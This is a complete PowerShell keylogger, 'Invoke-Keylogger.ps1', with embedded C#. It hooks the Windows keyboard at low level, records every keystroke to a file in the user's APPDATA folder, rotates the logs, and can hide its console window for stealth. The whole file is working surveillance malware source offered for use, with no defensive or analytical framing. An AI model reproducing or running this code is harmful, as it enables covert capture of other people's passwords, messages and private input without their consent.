########################################################################################
#                                                                                      |
#                 ███▄ ▄███▓ ██▓ ██▓ ██▀███   ▄▄▄      ▄▄▄       ██ ▄█▀                |
#                ▓██▒▀█▀ ██▒▓██▒▓██▒▓██ ▒ ██▒▒████▄   ▒████▄     ██▄█▒                 |
#                ▓██    ▓██░▒██▒▒██▒▓██ ░▄█ ▒▒██  ▀█▄ ▒██  ▀█▄  ▓███▄░                 |
#                ▒██    ▒██ ░██░░██░▒██▀▀█▄  ░██▄▄▄▄██░██▄▄▄▄██ ▓██ █▄                 |
#                ▒██▒   ░██▒░██░░██░░██▓ ▒██▒ ▓█   ▓██▒▓█   ▓██▒▒██▒ █▄                |
#                ░ ▒░   ░  ░░▓  ░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒   ▓▒█░▒ ▒▒ ▓▒                |
#                ░  ░      ░ ▒ ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒   ▒▒ ░░ ░▒ ▒░                |
#                ░      ░    ▒ ░ ▒ ░  ░░   ░   ░   ▒    ░   ▒   ░ ░░ ░                 |
#                       ░    ░   ░     ░           ░  ░     ░  ░░  ░                   |
#                                                                                      |
#     Title        : Invoke-Keylogger.ps1                                              |
#     Version      : 3.3                                                               |
#     Category     : collection/keylogging                                             |
#     Target       : Windows 10/11                                                     |
#     Description  : Advanced keylogger, hotkey/console stop, popup confirmation,      |
#                    log rotation, stealth, error handling, kill process.              |
#                                                                                      |
########################################################################################

<#
.SYNOPSIS
    Advanced keylogger for Windows: records keystrokes, supports stealth mode, log rotation, hotkey stop, and robust error handling.

.DESCRIPTION
    This keylogger logs all keystrokes to a file, can operate in stealth mode (hide console window), rotates logs when over size, flushes periodically, and can be stopped with a configurable hotkey (confirmation popup included). Handles errors and kills itself after repeated failures.

.PARAMETER LogPath
    Path to the log file. Default: $env:APPDATA\keylogger.txt

.PARAMETER MaxLogSizeKB
    Maximum log file size in KB before rotating to .old and starting a new log. Default: 1024

.PARAMETER FlushInterval
    Number of keystrokes before flushing log to disk. Default: 100

.PARAMETER StealthMode
    Hide the console window for stealth operation.

.PARAMETER Hotkey
    Hotkey to stop keylogger (format: Modifier+Key, e.g., Ctrl+Shift+Q). Default: Ctrl+Shift+Q

.EXAMPLE
    .\Invoke-Keylogger.ps1
    .\Invoke-Keylogger.ps1 -LogPath "C:\log.txt" -Hotkey "Ctrl+Alt+Z" -StealthMode
#>

# ------------- [Parameters] ------------- # 
param (
    [string]$LogPath = "$env:APPDATA\keylogger.txt",
    [int]$MaxLogSizeKB = 1024,
    [int]$FlushInterval = 100,
    [switch]$StealthMode,
    [string]$Hotkey = "Ctrl+Shift+Q"
)

# ------------- [Initialization] ------------- #
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
} catch {
    Write-Host "[ERROR] Windows.Forms/Drawing required." -ForegroundColor Red
    exit 1
}

# ------------- [Type Definitions] ------------- #
Add-Type -ReferencedAssemblies System.Windows.Forms,System.Drawing,System.IO -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
using Keys = System.Windows.Forms.Keys;

public class KeyboardListener {
    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    public static LowLevelKeyboardProc proc = HookCallback;
    public static IntPtr hookId = IntPtr.Zero;
    public static int keyCount = 0;
    public static int flushInterval = 100;
    public static int maxLogBytes = 1048576;
    public static string logPath = "";
    public static StreamWriter logFile;
    public static bool running = true;
    public static string hotkey = "Ctrl+Shift+Q";
    public static Keys hotkeyKey = Keys.Q;
    public static bool ctrlPressed = false;
    public static bool shiftPressed = false;
    public static int errorCount = 0;

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    public const int WH_KEYBOARD_LL = 13;
    public const int WM_KEYDOWN = 0x0100;
    public const int WM_KEYUP = 0x0101;

    public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        try {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP)) {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (key == Keys.ControlKey || key == Keys.LControlKey || key == Keys.RControlKey)
                    ctrlPressed = (wParam == (IntPtr)WM_KEYDOWN);
                if (key == Keys.ShiftKey || key == Keys.LShiftKey || key == Keys.RShiftKey)
                    shiftPressed = (wParam == (IntPtr)WM_KEYDOWN);

                if (ctrlPressed && shiftPressed && key == hotkeyKey && wParam == (IntPtr)WM_KEYDOWN) {
                    running = false;
                    ShowConfirmation();
                    return (IntPtr)1;
                }

                if (wParam == (IntPtr)WM_KEYDOWN && running) {
                    string keyStr = key.ToString();
                    logFile.Write(keyStr.Length == 1 ? keyStr : "[" + keyStr + "]");
                    keyCount++;

                    if (keyCount % flushInterval == 0)
                        logFile.Flush();

                    FileInfo fi = new FileInfo(logPath);
                    if (fi.Exists && fi.Length > maxLogBytes) {
                        logFile.Close();
                        File.Move(logPath, logPath + ".old");
                        logFile = new StreamWriter(logPath, true, Encoding.UTF8);
                    }
                }
            }
        } catch (Exception ex) {
            errorCount++;
            try { File.AppendAllText(logPath + ".err", DateTime.Now + " > " + ex.ToString() + Environment.NewLine); } catch {}
            if (errorCount < 5) Stop();
            else Process.GetCurrentProcess().Kill();
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    public static void ShowConfirmation() {
        DialogResult result = MessageBox.Show("Do you want to stop the keylogger?", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
        if (result == DialogResult.Yes) {
            Stop();
            Application.ExitThread();
        } else {
            running = true;
            errorCount = 0;
        }
    }

    public static void Start(string logFilePath, int flushInt, int maxKB, bool hideWindow, string hk) {
        logPath = logFilePath;
        flushInterval = flushInt;
        maxLogBytes = maxKB * 1024;
        hotkey = hk;
        hotkeyKey = ParseHotkey(hk);
        logFile = new StreamWriter(logPath, true, Encoding.UTF8);

        if (hideWindow) {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
        }

        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
        Application.Run();
    }

    public static void Stop() {
        try {
            if (hookId != IntPtr.Zero) UnhookWindowsHookEx(hookId);
            if (logFile != null) logFile.Close();
        } catch {}
    }

    public static Keys ParseHotkey(string hk) {
        string[] parts = hk.Split('+');
        return (Keys)Enum.Parse(typeof(Keys), parts[parts.Length - 1], true);
    }
}
"@

# ------------- [Parameters Display] ------------- #
Write-Host "[*] Log File      : $LogPath" -ForegroundColor Cyan
Write-Host "[*] Max Log Size  : $MaxLogSizeKB KB" -ForegroundColor Cyan
Write-Host "[*] Flush Interval: $FlushInterval" -ForegroundColor Cyan
Write-Host "[*] Hotkey        : $Hotkey" -ForegroundColor Cyan
Write-Host "[*] Stealth Mode  : $($StealthMode.IsPresent)" -ForegroundColor Cyan

# ------------- [Execution] ------------- #
[KeyboardListener]::Start($LogPath, $FlushInterval, $MaxLogSizeKB, $StealthMode.IsPresent, $Hotkey)